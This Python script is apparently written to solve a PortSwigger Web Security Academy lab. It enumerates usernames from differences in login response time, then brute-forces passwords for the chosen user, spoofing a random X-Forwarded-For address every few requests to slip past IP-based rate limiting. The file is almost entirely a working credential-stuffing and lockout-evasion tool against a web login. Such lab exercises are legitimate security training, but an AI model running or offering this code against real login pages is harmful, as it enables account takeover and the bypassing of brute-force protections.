from bs4    import BeautifulSoup
import requests
import time
import sys

import random
from ipaddress import IPv4Address

sys.path.append('../utils')

from utils import *

def random_ipv4():
    return str(IPv4Address(random.getrandbits(32)))

# ++++++++++++++++
# Constantly new.
# ++++++++++++++++
TARGET          = 'https://ac281f891e391c94c00288ad00b6008a.web-security-academy.net/login'

RESPONSE_OK     = 200
USERNAMES       = read_usernames()
PASSWORDS       = read_passwords()
LONG_PASSWORD   = bin(random.getrandbits(2048))[2:]
# AVG_RESP_TIME   = 20 

PAYLOAD = {
# ++++++++++++++++++++++++++++++++++
# if payload['password'] == None || payload['password'] == '' then:
#   Server response:      400
#
# ++++++++++++++++++++++++++++++++++
    'username': None,
    'password': LONG_PASSWORD
}

HEADERS = {
    'X-Forwarded-For': random_ipv4()
}

VALID_CREDENTIALS   = {}

max_responce_time   = 0
possible_user       = ''
counter             = 0

for username in USERNAMES:
    # ++++++++++++++++++++++++++++++++++++++
    # Change IP for every three requests.
    # ++++++++++++++++++++++++++++++++++++++
    counter += 1
    if counter % 4 == 0:
        HEADERS['X-Forwarded-For'] = random_ipv4()

    PAYLOAD['username'] = username

    start_time = time.time()
    r = requests.post(TARGET, headers = HEADERS, data = PAYLOAD)
    end_time = time.time()

    if r.status_code != RESPONSE_OK:
        print(r.status_code)
        continue
    
    responce_time = (end_time - start_time) * 10

    # +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    # Use when you understand what response time is appropriate.
    # +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    # if responce_time > AVG_RESP_TIME:
    #     VALID_CREDENTIALS[username] = None

    if responce_time > max_responce_time:
        max_responce_time = responce_time
        possible_user = username

VALID_CREDENTIALS[possible_user] = None
VALID_USERNAMES = VALID_CREDENTIALS.keys()

for username in VALID_USERNAMES:
    PAYLOAD['username'] = username

    for password in PASSWORDS:
        # ++++++++++++++++++++++++++++++++++++++
        # Change IP for every three requests.
        # ++++++++++++++++++++++++++++++++++++++
        counter += 1
        if counter % 4 == 0:
            HEADERS['X-Forwarded-For'] = random_ipv4()

        PAYLOAD['password'] = password

        r = requests.post(TARGET, headers = HEADERS, data = PAYLOAD)
        soup = BeautifulSoup(r.content, 'html.parser')

        if r.status_code != RESPONSE_OK:
            print(r.status_code)

        warning_tag = soup.find(class_ = 'is-warning')

        if type(warning_tag) == type(None):
            VALID_CREDENTIALS[username] = password
            break

print(VALID_CREDENTIALS)    
